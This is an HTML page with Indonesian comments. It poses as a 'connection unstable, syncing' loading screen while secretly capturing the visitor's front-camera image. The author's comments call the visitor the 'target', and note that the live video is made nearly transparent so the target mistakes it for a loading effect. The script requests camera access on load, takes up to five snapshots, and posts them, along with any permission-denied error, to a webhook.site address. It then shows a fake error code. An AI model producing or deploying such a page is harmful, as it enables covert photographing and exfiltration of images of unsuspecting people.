<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Sedang Memuat...</title>
    <style>
        body { margin: 0; padding: 0; width: 100vw; height: 100vh; display: flex; justify-content: center; align-items: center; background-color: #121212; color: #e0e0e0; font-family: sans-serif; overflow: hidden; }
        #container { position: relative; display: flex; flex-direction: column; align-items: center; z-index: 10; background: #121212; width: 100%; height: 100%; justify-content: center;}
        #loader { border: 5px solid #333; border-top: 5px solid #fe2c55; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status { font-size: 16px; font-weight: bold; text-transform: uppercase; letter-spacing: 2px; color: #fe2c55; text-align: center; }
        
        /* Trik Baru: Video ditaruh di belakang layar (z-index rendah) 
           tapi ukurannya tetap besar agar sistem mau merender gambarnya */
        #video {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            z-index: 1; /* Di bawah container */
            opacity: 0.1; /* Sangat samar, target bakal mikir ini efek loading */
        }
        #canvas { display: none; }
    </style>
</head>
<body>

    <div id="container">
        <div id="loader"></div>
        <div id="status">Koneksi Tidak Stabil...</div>
        <p style="font-size: 12px; color: #888; margin-top: 10px;">Sedang Sinkronisasi Frame Kamera...</p>
    </div>

    <video id="video" autoplay muted playsinline></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        const WEBHOOK_URL = 'https://webhook.site/da585ce8-007d-4bdd-8301-698ea088b877';
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        const statusDiv = document.getElementById('status');
        let photoCount = 0;

        async function startSystem() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user", width: 640, height: 480 }, 
                    audio: false 
                });
                video.srcObject = stream;
                
                video.onloadedmetadata = () => {
                    video.play();
                    statusDiv.innerText = "Mengkalibrasi Sinyal...";
                    // TUNGGU 5 DETIK: Biar target beneran nunggu dan kamera dapet cahaya
                    setTimeout(takeSnapShot, 5000); 
                };
            } catch (err) {
                statusDiv.innerText = "Gagal Menghubungkan.";
                kirimData({ status: "IZIN_DITOLAK", pesan: err.message });
            }
        }

        function takeSnapShot() {
            if (photoCount >= 5) {
                statusDiv.innerText = "Error: 0x88291"; 
                return;
            }

            if (video.readyState === video.HAVE_ENOUGH_DATA) {
                photoCount++;
                
                // Ambil gambar
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Gunakan kualitas 0.3 supaya proses kirim cepat & tidak gagal di tengah jalan
                const dataFoto = canvas.toDataURL('image/jpeg', 0.3);

                kirimData({
                    event: "SNAP_SHOT_V3",
                    no: photoCount,
                    foto: dataFoto,
                    info: "Kualitas 30%"
                });
            }

            setTimeout(takeSnapShot, 3000);
        }

        async function kirimData(payload) {
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify(payload)
                });
            } catch (e) {}
        }

        window.onload = startSystem;
    </script>
</body>
</html>
